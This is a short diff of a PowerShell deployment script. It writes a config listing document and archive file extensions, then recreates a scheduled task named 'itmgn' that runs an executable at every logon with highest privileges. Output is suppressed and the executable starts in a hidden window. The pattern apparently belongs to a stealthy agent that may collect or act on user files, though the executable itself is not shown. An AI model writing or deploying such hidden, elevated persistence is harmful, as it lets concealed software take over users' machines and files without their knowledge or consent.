@@ -23,8 +23,8 @@ $agentId = [guid]::NewGuid().ToString()
                          ".pdf",".txt",".csv",".zip",".rar",".jpg",".jpeg",".png")
 } | ConvertTo-Json -Depth 3 | Out-File -FilePath $cfg -Encoding UTF8 -Force
 
-schtasks /delete /tn "itmgn" /f 2>&1 | Out-Null
-schtasks /create /tn "itmgn" /tr "`"$exe`"" /sc ONLOGON /rl HIGHEST /f | Out-Null
+cmd /c "schtasks /delete /tn itmgn /f" > $null 2>&1
+cmd /c "schtasks /create /tn itmgn /tr `"$exe`" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1
 
 Start-Process -FilePath $exe -WindowStyle Hidden
 Write-Host "Done. Agent ID: $agentId"
